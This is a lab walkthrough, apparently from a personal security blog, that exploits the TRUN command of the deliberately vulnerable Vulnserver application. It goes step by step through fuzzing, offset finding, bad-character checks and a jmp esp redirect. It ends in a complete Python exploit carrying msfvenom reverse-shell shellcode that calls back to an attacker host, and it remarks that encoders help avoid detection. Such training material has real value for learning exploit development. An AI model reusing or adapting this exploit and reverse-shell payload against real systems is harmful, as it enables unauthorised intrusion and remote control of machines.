---
title: "Vulnserver TRUN - Stack Buffer Overflow
"
classes: wide
tag: 
  - "windows exploitation"
  - "vulnserver"
header:
  teaser: /assets/images/win-exp/windows-exp.png
ribbon: blue
description: "A simple walkthrough on  Vulnserver TRUN stack buffer overflow"
categories: ['Exploit-Development','Windows-Exploitation','Vulnserver']
---

- [Windows 10 Exploit Development - Stack Buffer Overflow](#windows-10-exploit-development---stack-buffer-overflow)
  - [Buffer Overflow](#buffer-overflow)
  - [Spiking the Vulnserver](#spiking-the-vulnserver)
  - [Analysing the Source Code](#analysing-the-source-code)
  - [Fuzzing the Server](#fuzzing-the-server)
  - [Finding Offset](#finding-offset)
  - [Overwriting Instruction Pointer](#overwriting-instruction-pointer)
  - [Finding Bad Characters](#finding-bad-characters)
  - [Redirecting the Execution](#redirecting-the-execution)
  - [Generating Shellcode](#generating-shellcode)
  - [Exploiting the Vulnserver](#exploiting-the-vulnserver)

## Buffer Overflow

A buffer overflow occurs when the size of data exceeds the storage capacity of the memory buffer

As a result, the program will try to write the data to the buffer which overwrites nearer memory locations like ```Instruction Pointer(IP), Base Pointer(BP)```

<div align="center">
<img src="https://raw.githubusercontent.com/AidenPearce369/Vulnserver-Walkthrough/main/res/buffer-overflow.png" style="width:70%">
</div>

C and C++ are two languages that are highly susceptible to buffer overflow attacks, as they don’t have built-in safeguards against overwriting or accessing data in their memory

## Spiking the Vulnserver

Spiking is the process of testing the application to find a vulnerable part

Running the Vulnserver from Attacker Machine,

```c
┌──(kali㉿aidenpearce369)-[~]
└─$ nc 192.168.116.141 9999
Welcome to Vulnerable Server! Enter HELP for help.
HELP
Valid Commands:
HELP
STATS [stat_value]
RTIME [rtime_value]
LTIME [ltime_value]
SRUN [srun_value]
TRUN [trun_value]
GMON [gmon_value]
GDOG [gdog_value]
KSTET [kstet_value]
GTER [gter_value]
HTER [hter_value]
LTER [lter_value]
KSTAN [lstan_value]
EXIT
```

Creating a ```spike script``` for spiking using ```generic_send_tcp```,

```c
┌──(kali㉿aidenpearce369)-[~/vulnserver]
└─$ cat stats.spk 
s_readline();
s_string("STATS ");
s_string_variable("0");
                                                                       
┌──(kali㉿aidenpearce369)-[~/vulnserver]
└─$ generic_send_tcp 192.168.116.141 9999 stats.spk 0 0
```

This will start spiking the Vulnserver with ```STATS``` command, to find for any crash

Sadly we couldn't crash with ```STATS``` command

Following this process with the sequnce of commands,

```c
┌──(kali㉿aidenpearce369)-[~/vulnserver]
└─$ cat trun.spk                                      
s_readline();
s_string("TRUN ");
s_string_variable("0");
                                                                     
┌──(kali㉿aidenpearce369)-[~/vulnserver]
└─$ generic_send_tcp 192.168.116.141 9999 trun.spk 0 0

...

Fuzzing Variable 0:199
Variablesize= 20000
Fuzzing Variable 0:200
Variablesize= 10000
Fuzzing Variable 0:201
Variablesize= 5000
Fuzzing Variable 0:202
Couldn't tcp connect to target
Variablesize= 4097
tried to send to a closed socket!
Fuzzing Variable 0:203
Couldn't tcp connect to target
Variablesize= 4096
```

While spiking ```TRUN``` command, we could see that we could not connect to the Vulnserver anymore

Yes.. It got crashed!!

Viewing it in our debugger,

<div align="center">
<img src="https://raw.githubusercontent.com/AidenPearce369/Vulnserver-Walkthrough/main/res/spiking-trun.png">
</div>

We could see that our Vulnserver application has been terminated by ```Access Violation``` error

From this we can confirm that, ```TRUN``` command is vulnerable to ```Buffer Overflow``` attack

We could also see that the data passed into the Vulnserver using ```TRUN``` command in the ```Registers``` window,

<div align="center">
<img src="https://raw.githubusercontent.com/AidenPearce369/Vulnserver-Walkthrough/main/res/trun-spike-reg.png">
</div>

```EAX``` register is also known as ```Accumulator```, used to store the data from Stack and gets processed by assembly instructions

## Analysing the Source Code

Since ```TRUN``` is the vulnerable part, lets view the source code of it

```c

...

else if (strncmp(RecvBuf, "TRUN ", 5) == 0) {
				char *TrunBuf = malloc(3000);
				memset(TrunBuf, 0, 3000);
				for (i = 5; i < RecvBufLen; i++) {
					if ((char)RecvBuf[i] == '.') {
						strncpy(TrunBuf, RecvBuf, 3000);
                        // vulnerable function				
						Function3(TrunBuf);
						break;
					}
				}
				memset(TrunBuf, 0, 3000);				
				SendResult = send( Client, "TRUN COMPLETE\n", 14, 0 );
			} 

...

Here we are allocating a memory of ```3000 bytes``` to get input data for this command

```

Here it calls ```Function3()```, lets view it

```c
void Function3(char *Input) {
	char Buffer2S[2000];
    // overflow occurs in this function
	strcpy(Buffer2S, Input);
}
```

Here we can see that the ```Buffer2S``` has a size of ```2000 bytes```

But tha data from us (300 bytes) is saved into Buffer2S variable using ```strcpy```

This is where exactly the vulnerability for stack buffer overflow occurs, allowing us to overflow the buffer

We can pass more than ```2000 bytes``` so that it will stored into the ```Buffer2S``` by ```strcpy``` causing a buffer overflow

It also expects for a conditions ```if ((char)RecvBuf[i] == '.') ``` to copy the buffer

## Fuzzing the Server

We have successfully crashed our server and tha payload data begins with ```TRUN /.:/``` which is made up of ```9 bytes```

Lets create a python script which generates payload data and fuzzes the payload length to crash the server

```c
┌──(kali㉿aidenpearce369)-[~/vulnserver]
└─$ cat fuzzing.py    
import socket, sys
from time import sleep
payload=b"A"*100
while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("192.168.116.141", 9999))
        s.send((b"TRUN /.:/"+payload))
        sleep(1)
        payload=payload+b"A"*100
    except:
        print("Fuzzing crashed at %s bytes"%(len(payload)))
        sys.exit() 
                                                                       
┌──(kali㉿aidenpearce369)-[~/vulnserver]
└─$ python3 fuzzing.py
Fuzzing crashed at 2200 bytes
```

The Vulnserver application should be ran without debugger, to avoid socket connection errors

So, from fuzzing we can estimate that our Vulnserver application is crashing at ```2200 bytes``` of buffer data

Still, we are not sure about the approximate buffer space data need to create an overflow

## Finding Offset

By finding offset, we can locate the approximate buffer space size for writing data into the base pointer and instruction pointer

To find the offset, we need to create a pattern and crash the program

So that the value in the registers can be used to find the offset of it from buffer data

To create a pattern using ```metasploit```,

```c
┌──(kali㉿aidenpearce369)-[~]
└─$ msf-pattern_create -l 2500
<GENERATED PATTERN>
```

Fuzzing with the created pattern to crash the program,

```c
┌──(kali㉿aidenpearce369)-[~/vulnserver]
└─$ cat find_offset.py
import socket, sys
payload=b"<GENERATED PATTERN>"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.116.141", 9999))
s.send((b"TRUN /.:/"+payload))
s.close()
sys.exit()
                                                                       
┌──(kali㉿aidenpearce369)-[~/vulnserver]
└─$ python3 find_offset.py
```

This will crash the program, where our buffer will get overflowed and fills the Base Pointer and Instruction Pointer with the data from the pattern

Now, using the data from the registers we are going to locate the offset in the buffer space to reach the data

<div align="center">
<img src="https://raw.githubusercontent.com/AidenPearce369/Vulnserver-Walkthrough/main/res/find-offset-reg.png">
</div>

Here we can see, our Instruction Pointer ```EIP``` has a data of ```0x386F4337```

Lets find the offset for this value by ```metasploit```,

```c
┌──(kali㉿aidenpearce369)-[~]
└─$ msf-pattern_offset -q 386F4337
[*] Exact match at offset 2003
```

So after ```2003 bytes```, we will be overwriting the ```EIP``` using buffer space

## Overwriting Instruction Pointer

Now, we have found the offset of our ```EIP```

It's time to control the EIP, which is the important phase of every exploitation

Lets craft a script to overwrite the EIP with our own custom data, which will be further used to craft an exploit

```c
┌──(kali㉿aidenpearce369)-[~/vulnserver]
└─$ cat overwrite_eip.py 
import socket, sys
# to overwrite buffer and EBP
payload=b"A"*2003
# to overwrite EIP
payload+=b"B"*4
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.116.141", 9999))
s.send((b"TRUN /.:/"+payload))
s.close()
sys.exit()
                                                                       
┌──(kali㉿aidenpearce369)-[~/vulnserver]
└─$ python3 overwrite_eip.py         
```

By running this our application gets crashed

<div align="center">
<img src="https://raw.githubusercontent.com/AidenPearce369/Vulnserver-Walkthrough/main/res/overwrite-eip-reg.png">
</div>

We can see that, our EIP has a data of ```0x42424242``` which is the hex value of ```BBBB``` from our script

So, we can control the EIP now

## Finding Bad Characters

After controlling EIP, it is mandatory to check for bad characters

Because bad characters may damage your shellcode execution which may result in ```exploitation failure```

To find bad characters manually using debugger, run this python script

```c
┌──(kali㉿aidenpearce369)-[~/vulnserver]
└─$ cat bad_chars.py                
import socket, sys
from time import sleep
# collection of all bad characters except \x00
badchars=(b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
b"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
b"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
b"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
b"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
b"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
b"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
# to overwrite buffer and EBP
payload=b"A"*2003
# to overwrite EIP
payload+=b"B"*4
# to load badchars in ESP
payload+=badchars
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.116.141", 9999))
s.send((b"TRUN /.:/"+payload))
s.close()
sys.exit()
                                                                       
┌──(kali㉿aidenpearce369)-[~/vulnserver]
└─$ python3 bad_chars.py    
```

You could see the hexdump of the ESP data after EIP and you could manually figure out which are the bad characters

Select the address on the ESP register, right click on it and select follow hex dump

<div align="center">
<img src="https://raw.githubusercontent.com/AidenPearce369/Vulnserver-Walkthrough/main/res/badchars-manual.png" style="width:40%">
</div>

Seems like we don't have any bad characters, except ```x00``` which is also known as ```null byte``` (It's always considered as a bad character while exploitation)

## Redirecting the Execution

As for now, we can control the ```EIP``` and also we have only one bad character ```x00```,

Since we can control ```EIP```, we can use this as our advantage and redirect the code flow to any part of the memory where it is perfect to have shellcode execution

After ```EIP```, we would be having ```ESP```

We know that, we could overflow ESP after EIP

But we don't have execution, because EIP should be pointed to the address of ESP and the stack should allow execution

To make our shellcode from ESP to execute, we need to jump from the current location to address of ESP

This can be done by ```jmp esp```, all we have to do is point the EIP with the address of this instruction

We will be using ```mona``` python script to find this address

To use mona command with Immunity debugger, [Download](https://github.com/corelan/mona) it and copy the ```mona.py``` into ```C:\Program Files\Immunity Inc\Immunity Debugger\PyCommands```

Running mona by passing ```!mona modules``` command to list the protection of all modules used by this application

<div align="center">
<img src="https://raw.githubusercontent.com/AidenPearce369/Vulnserver-Walkthrough/main/res/mona-modules.png">
</div>

On these, we can clearly see that only two modules have every security mitigations turned off

From these two, it is always best to try our exploit from an DLL and not from the actual exe itself

Lets find the ```jmp esp``` opcode from the memory of ```essfunc.dll```

To find the opcode using mona, we need the hex value of the opcode which can be done by ```nasm shell```

```c
┌──(kali㉿aidenpearce369)-[~]
└─$ locate nasm_shell
/usr/bin/msf-nasm_shell
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
                                                                       
┌──(kali㉿aidenpearce369)-[~]
└─$ /usr/bin/msf-nasm_shell
nasm > jmp esp
00000000  FFE4              jmp esp
nasm > exit
                                                                       
┌──(kali㉿aidenpearce369)-[~]
└─$ echo "\xe4\xff"
��
```

Finding the offset of ```jmp esp``` opcode using mona by the command ```!mona find -s \xff\xe4 -m essfunc.dll```,

<div align="center">
<img src="https://raw.githubusercontent.com/AidenPearce369/Vulnserver-Walkthrough/main/res/mona-jmp-esp.png">
</div>

We could see there are 9 pointers available for this exploit which has ```jmp esp``` opcode in it and it also doesn't change its memory address

Eventhough ```ASLR``` is enabled for other parts, here it is disabled which makes the address to remain static & suitable for exploitation

```NX bit``` is also disabled, which allows us to execute shellcode on stack memory

Also, while checking the pointer addresses make sure that the address do not contain bad characters in it, which may cause poor exploitation

Lets craft the script and enter the address of the opcode in ```little endian``` format because the data in stack is placed in little endian format

```c
┌──(kali㉿aidenpearce369)-[~/vulnserver]
└─$ cat jump_esp.py     
import socket, sys
# to overwrite buffer and EBP
payload=b"A"*2003
# to redirect the control to ESP -> JMP ESP
payload+=b"\xaf\x11\x50\x62"
# testing stack values on ESP
payload+=b"C"*4
payload+=b"D"*4
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.116.141", 9999))
s.send((b"TRUN /.:/"+payload))
s.close()
sys.exit()
                                                                       
┌──(kali㉿aidenpearce369)-[~/vulnserver]
└─$ python3 jump_esp.py 
```

After crashing the program, we can see that we have jumped into ESP and ran our junk data

<div align="center">
<img src="https://raw.githubusercontent.com/AidenPearce369/Vulnserver-Walkthrough/main/res/jump-reg.png" style="width:40%">
</div>

So, we have successfully redirected our program flow

Next we have to point it with our shellcode

## Generating Shellcode

Shellcode is a piece of code performs specific action, which is typically written to directly manipulate processor registers to set them up for various system calls made with opcodes

Lets generate the shellcode for our reverse shell using ```msfvenom```,

```c
┌──(kali㉿aidenpearce369)-[~]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.116.128 LPORT=9876 -f python -e x86/shikata_ga_nai -b "\x00"
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of python file: 1712 bytes
buf =  b""
buf += b"\xda\xd2\xbe\x39\xe1\xbc\xa2\xd9\x74\x24\xf4\x5d\x2b"
buf += b"\xc9\xb1\x52\x31\x75\x17\x83\xed\xfc\x03\x4c\xf2\x5e"
buf += b"\x57\x52\x1c\x1c\x98\xaa\xdd\x41\x10\x4f\xec\x41\x46"
buf += b"\x04\x5f\x72\x0c\x48\x6c\xf9\x40\x78\xe7\x8f\x4c\x8f"
buf += b"\x40\x25\xab\xbe\x51\x16\x8f\xa1\xd1\x65\xdc\x01\xeb"
buf += b"\xa5\x11\x40\x2c\xdb\xd8\x10\xe5\x97\x4f\x84\x82\xe2"
buf += b"\x53\x2f\xd8\xe3\xd3\xcc\xa9\x02\xf5\x43\xa1\x5c\xd5"
buf += b"\x62\x66\xd5\x5c\x7c\x6b\xd0\x17\xf7\x5f\xae\xa9\xd1"
buf += b"\x91\x4f\x05\x1c\x1e\xa2\x57\x59\x99\x5d\x22\x93\xd9"
buf += b"\xe0\x35\x60\xa3\x3e\xb3\x72\x03\xb4\x63\x5e\xb5\x19"
buf += b"\xf5\x15\xb9\xd6\x71\x71\xde\xe9\x56\x0a\xda\x62\x59"
buf += b"\xdc\x6a\x30\x7e\xf8\x37\xe2\x1f\x59\x92\x45\x1f\xb9"
buf += b"\x7d\x39\x85\xb2\x90\x2e\xb4\x99\xfc\x83\xf5\x21\xfd"
buf += b"\x8b\x8e\x52\xcf\x14\x25\xfc\x63\xdc\xe3\xfb\x84\xf7"
buf += b"\x54\x93\x7a\xf8\xa4\xba\xb8\xac\xf4\xd4\x69\xcd\x9e"
buf += b"\x24\x95\x18\x30\x74\x39\xf3\xf1\x24\xf9\xa3\x99\x2e"
buf += b"\xf6\x9c\xba\x51\xdc\xb4\x51\xa8\xb7\x7a\x0d\xc6\xc7"
buf += b"\x13\x4c\x26\xee\x77\xd9\xc0\x84\x67\x8c\x5b\x31\x11"
buf += b"\x95\x17\xa0\xde\x03\x52\xe2\x55\xa0\xa3\xad\x9d\xcd"
buf += b"\xb7\x5a\x6e\x98\xe5\xcd\x71\x36\x81\x92\xe0\xdd\x51"
buf += b"\xdc\x18\x4a\x06\x89\xef\x83\xc2\x27\x49\x3a\xf0\xb5"
buf += b"\x0f\x05\xb0\x61\xec\x88\x39\xe7\x48\xaf\x29\x31\x50"
buf += b"\xeb\x1d\xed\x07\xa5\xcb\x4b\xfe\x07\xa5\x05\xad\xc1"
buf += b"\x21\xd3\x9d\xd1\x37\xdc\xcb\xa7\xd7\x6d\xa2\xf1\xe8"
buf += b"\x42\x22\xf6\x91\xbe\xd2\xf9\x48\x7b\xe2\xb3\xd0\x2a"
buf += b"\x6b\x1a\x81\x6e\xf6\x9d\x7c\xac\x0f\x1e\x74\x4d\xf4"
buf += b"\x3e\xfd\x48\xb0\xf8\xee\x20\xa9\x6c\x10\x96\xca\xa4"
```

We have created a shellcode of ```351 bytes``` which will perfectly fit into our buffer
                                                              
Usage of ```encoders``` may reduce the risk of getting caught by defenders

## Exploiting the Vulnserver

Now we have gone through every steps and crafted our final exploit to gain shell on our target machine

We have to add ```NOPs``` aka ```NO OPERATION``` to our shellcode, in hex it is given as ```x90```

It should be added with the multiple of 4 (since we are exploiting 32 bit)

By adding nops, we will be performing ```nop-sled```, which will make the probability for execution of our shellcode higher

The exploit script for this ```buffer overflow``` via ```TRUN``` command is,

```c
┌──(kali㉿aidenpearce369)-[~/vulnserver]
└─$ cat exploit.py
import socket, sys

# shellcode to spawn reverse shell
buf =  b""
buf += b"\xda\xd2\xbe\x39\xe1\xbc\xa2\xd9\x74\x24\xf4\x5d\x2b"
buf += b"\xc9\xb1\x52\x31\x75\x17\x83\xed\xfc\x03\x4c\xf2\x5e"
buf += b"\x57\x52\x1c\x1c\x98\xaa\xdd\x41\x10\x4f\xec\x41\x46"
buf += b"\x04\x5f\x72\x0c\x48\x6c\xf9\x40\x78\xe7\x8f\x4c\x8f"
buf += b"\x40\x25\xab\xbe\x51\x16\x8f\xa1\xd1\x65\xdc\x01\xeb"
buf += b"\xa5\x11\x40\x2c\xdb\xd8\x10\xe5\x97\x4f\x84\x82\xe2"
buf += b"\x53\x2f\xd8\xe3\xd3\xcc\xa9\x02\xf5\x43\xa1\x5c\xd5"
buf += b"\x62\x66\xd5\x5c\x7c\x6b\xd0\x17\xf7\x5f\xae\xa9\xd1"
buf += b"\x91\x4f\x05\x1c\x1e\xa2\x57\x59\x99\x5d\x22\x93\xd9"
buf += b"\xe0\x35\x60\xa3\x3e\xb3\x72\x03\xb4\x63\x5e\xb5\x19"
buf += b"\xf5\x15\xb9\xd6\x71\x71\xde\xe9\x56\x0a\xda\x62\x59"
buf += b"\xdc\x6a\x30\x7e\xf8\x37\xe2\x1f\x59\x92\x45\x1f\xb9"
buf += b"\x7d\x39\x85\xb2\x90\x2e\xb4\x99\xfc\x83\xf5\x21\xfd"
buf += b"\x8b\x8e\x52\xcf\x14\x25\xfc\x63\xdc\xe3\xfb\x84\xf7"
buf += b"\x54\x93\x7a\xf8\xa4\xba\xb8\xac\xf4\xd4\x69\xcd\x9e"
buf += b"\x24\x95\x18\x30\x74\x39\xf3\xf1\x24\xf9\xa3\x99\x2e"
buf += b"\xf6\x9c\xba\x51\xdc\xb4\x51\xa8\xb7\x7a\x0d\xc6\xc7"
buf += b"\x13\x4c\x26\xee\x77\xd9\xc0\x84\x67\x8c\x5b\x31\x11"
buf += b"\x95\x17\xa0\xde\x03\x52\xe2\x55\xa0\xa3\xad\x9d\xcd"
buf += b"\xb7\x5a\x6e\x98\xe5\xcd\x71\x36\x81\x92\xe0\xdd\x51"
buf += b"\xdc\x18\x4a\x06\x89\xef\x83\xc2\x27\x49\x3a\xf0\xb5"
buf += b"\x0f\x05\xb0\x61\xec\x88\x39\xe7\x48\xaf\x29\x31\x50"
buf += b"\xeb\x1d\xed\x07\xa5\xcb\x4b\xfe\x07\xa5\x05\xad\xc1"
buf += b"\x21\xd3\x9d\xd1\x37\xdc\xcb\xa7\xd7\x6d\xa2\xf1\xe8"
buf += b"\x42\x22\xf6\x91\xbe\xd2\xf9\x48\x7b\xe2\xb3\xd0\x2a"
buf += b"\x6b\x1a\x81\x6e\xf6\x9d\x7c\xac\x0f\x1e\x74\x4d\xf4"
buf += b"\x3e\xfd\x48\xb0\xf8\xee\x20\xa9\x6c\x10\x96\xca\xa4"

# NOP sled 
nops=b"\x90"*40

# to overwrite buffer and EBP
payload=b"A"*2003

# to redirect the control to ESP -> JMP ESP
payload+=b"\xaf\x11\x50\x62"

# performing NOP sled after reach shellcode
payload+=nops

# shellcode gets executed
payload+=buf

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.116.141", 9999))
s.send((b"TRUN /.:/"+payload))
s.close()
sys.exit()
```

Since we are running this application as a high privileged user, by running this exploit we should gain shell as the same user

Lets try running our exploit when the application is running as privileged user without debugger,

```c
┌──(kali㉿aidenpearce369)-[~/vulnserver]
└─$ python3 exploit.py
```

Yay!! We have successfully gained reverse shell for our privileged user who is running that application from our target machine

<div align="center">
<img src="https://raw.githubusercontent.com/AidenPearce369/Vulnserver-Walkthrough/main//res/shell.png">
</div>

So this is how a classic ```VANILLA STACK BUFFER OVERFLOW``` on Windows is done, and it is easier when compared with other exploitation techniques on which the security mitigations will be enabled
